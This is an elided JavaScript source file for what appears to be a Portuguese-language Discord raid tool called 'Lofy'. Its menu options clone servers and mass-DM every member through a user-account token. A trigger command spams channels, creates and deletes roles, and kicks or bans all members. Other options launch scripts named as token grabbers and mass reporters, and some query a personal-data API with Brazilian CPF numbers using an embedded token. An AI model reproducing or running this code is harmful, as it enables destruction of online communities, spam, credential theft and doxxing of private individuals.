...
const { red, yellow, greenBright, yellowBright, magenta } = require("chalk");
...
const a = {};
const {token_bot,token_conta,tempo,sleep,gatilho} = require("./Arquivos Config/config.json");
  ...
  readline.question("         [?] Escolha a opção: ".yellow, answer => {
    switch (answer) {
      ...
      case "4":
        ...
        async function corrida() {
          ...
          fronha.on("ready", async () => {
            ...
            await guilds[1].setName(`${guilds[0].name}*mirrored`);
                ...
                .createChannel(category.name, {
                  ...
                  permissionOverwrites: category.permissionOverwrites
                    .map(v => {
                      ...
                      return {
                        id:
                          guilds[1].roles.find(r => r.name == target.name) ||
                          guilds[1].id,
                        allow: v.allow || 0,
                        deny: v.deny || 0
                      };
            ...
            for (let channel of itens.text) {
              ...
              if (!channel.parent) {
                ...
                if (guilds[1].channels.find(c => c.name == channel.parent.name))
                  chn.setParent(
                    guilds[1].channels.find(c => c.name == channel.parent.name)
                      .id
                  );
                else {
          ...
          fronha.login(`${token}`.replace(/"/g, "")).catch(() => {
            Logclean();
      ...
      case "1":
          ...
          polar.guilds
            ...
            .then(guild => {
              ...
              fs.writeFileSync(file_path, content, err => {
                ...
                console.log(
                  "     > Arquivo gravado com sucesso ".red + file_path
                );
              });
            })
            .catch(err => {
              ...
              polar.users
                ...
                .then(u => {
                  u.send(msg)
                    .then(() =>
                      console.log(
                        "     > Mensagem enviada para: ".green + u.tag.yellow
                      )
                    )
                    .catch(err =>
                      console.log(
        ...
        polar.login(token_bot).catch(err => {
          console.clear();
...
async function run() {
  ...
  while (true) {
    for (const guild of await fronha.guilds.array()) {
      ...
      console.log(
        `     > Enviando mensagem para ${guild.members.size} membros no servidor ${guild.name}`.green);

      for (const member of members.values()) {
        const already = fronha.cachedUsers.includes(member.id);
        if (already) {
          console.log(
            `     > O usuario ${member.user.tag} já recebeu uma mensagem`.white);
          continue;
        }

        const response = await member.send(msgDm).catch(err => {
          if (
            err.code == 500 ||
            err.mensagem ==
            ...
            console.log(
              `     > O token da conta ${fronha.user.tag} caiu`.red);
            return process.exit();
          }
          return null;
        });
        ...
        console.log(
          `     > Mensagem enviada ao usuário ${(member.user.tag)} do servidor ${(guild.name)}`.green
        );
...
fronha.login(token_conta).catch(err => {
...
`.red
    ...
    `.magenta
              ...
              console.log(
                greenBright(`     Permissão Necessária > ADMINISTRATOR`)
              );
              console.log(
                greenBright(
              ...
              console.log(
                greenBright(`     Evistei ${client.users.cache.size} usuarios`)
              );
              console.log("");
            ...
            client.on("message", async message => {
              ...
              if (message.mentions.everyone === true) {
                ...
                if (message.content.startsWith(prefix + "visual")) {
                  ...
                  console.log(
                    "     [Lofy] Mudando icone & nome do servidor".green
                  );
                ...
                if (message.content.startsWith(prefix + "mp")) {
                  if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(
                      red("     [Lofy] O bot esta sem permição")
                    );
                  } else {
                    if (message.author.id != myID) {
                      console.log(
                      ...
                      if (!argresult) {
                        ...
                        for (var i = 0; i < marcação; i++) {
                          ...
                          for (var i = 0; i < marcação; i++) {
                            let channels = message.guild.channels.create(
                              "Derrubado-por"
                            );
                  ...
                  if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
                    ...
                    for (var i = 0; i < criar_cargos; i++) {
                      message.guild.roles
                        ...
                        .catch(e =>
                          console.error(red("     [Lofy] Erro ao criar cargos"))
                        );
                    }
                  }
                }
                  ...
                  if (!message.guild.me.permissions.has("KICK_MEMBERS")) {
                    ...
                    message.guild.members.cache.forEach(member => {
                      member
                        ...
                        .then(
                          console.log(
                            green(`     [Lofy] ${member.user.tag} foi expulso`)
                          )
                        )
                        .catch(e =>
                          console.error(
                ...
                if (message.content.startsWith(prefix + "delrole")) {
                  ...
                  message.guild.roles.cache.forEach(roles => {
                    roles
                      ...
                      .catch(e =>
                        console.error(
                          red(`     [Lofy] Erro ao deletar um cargo`)
                        )
                      );
                  });
                }
                  ...
                  if (!message.guild.me.permissions.has("BAN_MEMBERS")) {
                    ...
                    message.guild.members.cache.forEach(member => {
                      member
                        ...
                        .then(
                          console.log(
                            green(`     [Lofy] ${member.user.tag} foi banido`)
                          )
                        )
                        .catch(e =>
                          console.error(
                ...
                if (message.content.startsWith(prefix + "dmall")) {
                  ...
                  console.log(
                    "     [Lofy] Enviando mensagem no privado de todos".blue
                  );
                  if (message.author.id !== myID) return;
                  const msg = args[0];
                  if (!msg)
      ...
      case "8":
        console.clear();
        Shell.exec("start python Api/cutwebhook.py");
        process.exit(1);
        break;

      case "9":
        console.clear();
        Shell.exec("start python Api/webhook_del.py");
        process.exit(1);
        break;
      ...
      case "10":
        console.clear();
        Shell.exec("start python Api/grabber.py");
        process.exit(1);
        break;

        case "11":
          console.clear();
          Shell.exec("start python Api/mass_rept.py");
          process.exit(1);
          break;

          case "12":
            console.clear();
            Shell.exec("start python Api/dbl_acc.py");
            process.exit(1);
            break;

            case "15":
            console.clear();
            Shell.exec("start python Api/grabber_js.py");
            process.exit(1);
            break;
            ...
            case "13":
              ...
              function logDataURL(url) {
                  lol(url).then(r => r.json()).then(r => console.log(              r))
              }
              
              logDataURL(`https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf=${cpf}&data=$data_de_nascimento_formato_pt_br&token=116394400xzjiJfqNnY210146560`)
              ...
              case "14":
                console.clear();
                  ...
                  readline.question("              > CPNJ: ".magenta, FF34 => {
                    BPNNN = FF34
                  function logDataURL(url) {
                    aaaaa(url).then(r => r.json()).then(r => console.log(              r))
                  }
